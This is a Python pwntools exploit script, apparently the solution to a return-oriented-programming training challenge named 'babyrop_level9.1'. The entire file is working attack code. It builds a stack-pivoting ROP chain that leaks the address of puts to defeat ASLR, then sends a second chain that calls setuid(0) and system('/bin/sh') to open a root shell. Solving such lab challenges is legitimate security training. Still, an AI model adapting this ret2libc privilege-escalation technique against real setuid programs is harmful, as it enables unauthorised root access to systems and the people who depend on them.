from pwn import *

context.update(arch='amd64', os='linux')

binary = ELF('/challenge/babyrop_level9.1')

puts_plt = binary.plt['puts']
puts_got = binary.got['puts']
main_addr = binary.symbols["main"]

libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

r = process(binary.path)

pop_rsp = 0x000000000040143d
stack_pivot = 0x4140a0
ret_chall = 0x00000000004012ba
pop_rdi = 0x0000000000401443

payload = p64(pop_rsp)
payload += p64(stack_pivot)
payload += p64(0x0)
payload += p64(0x0)
payload += p64(0x0)
payload += p64(0x0)
payload += p64(0x0)
payload += p64(0x0000000000401443)
payload += p64(puts_got)
payload += p64(puts_plt)
payload += p64(0x4012d1)
payload += p64(0x000000000040101a)

r.sendline(payload)
leak = r.recv(1024).splitlines()[-1]
leak_puts = u64(leak.ljust(8, b'\x00')) - 541728
log.info(f"Leaked puts address: {hex(leak_puts)}")

libc_base = leak_puts
log.info(f"Libc base address: {hex(libc_base)}")
setuid = libc_base + libc.symbols['setuid']
system = libc_base + libc.symbols['system']
bin_sh = libc_base + next(libc.search(b"/bin/sh"))

log.info(f"System address: {hex(system)}")
log.info(f"/bin/sh address: {hex(bin_sh)}")

payload2 = p64(pop_rsp)
payload2 += p64(stack_pivot)
payload2 += p64(0x0)
payload2 += p64(0x0)
payload2 += p64(0x0)
payload2 += p64(0x0)
payload2 += p64(0x0)
payload2 += p64(0x0)
payload2 += p64(0x0)
payload2 += p64(0x0)
payload2 += p64(pop_rdi)
payload2 += p64(0x0)
payload2 += p64(setuid)
payload2 += p64(pop_rdi)
payload2 += p64(bin_sh)
payload2 += p64(0x000000000040101a)
payload2 += p64(system)
r.sendline(payload2)

r.interactive()